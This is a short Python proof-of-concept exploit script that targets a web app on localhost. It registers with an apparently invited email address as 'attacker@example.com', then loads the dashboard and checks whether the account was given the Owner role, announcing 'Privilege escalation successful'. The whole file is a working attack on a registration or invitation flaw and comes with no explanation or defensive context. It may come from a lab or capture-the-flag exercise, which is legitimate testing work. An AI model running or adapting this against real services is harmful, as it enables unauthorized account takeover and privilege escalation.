import requests

BASE_URL = 'http://127.0.0.1:5000'

# Step 1: Register using the invited email
session = requests.Session()
email = 'attacker@example.com'

print(f"[+] Registering as {email}")
resp = session.post(f'{BASE_URL}/', data={'email': email})

# Step 2: Access the dashboard
resp = session.get(f'{BASE_URL}/dashboard')

if 'Owner' in resp.text or 'owner' in resp.text:
    print("[+] Privilege escalation successful! Role = Owner")
else:
    print("[!] Exploit failed or no elevated privileges.")

# Optional: Show dashboard content
print("\n--- Dashboard Content ---\n")
print(resp.text)
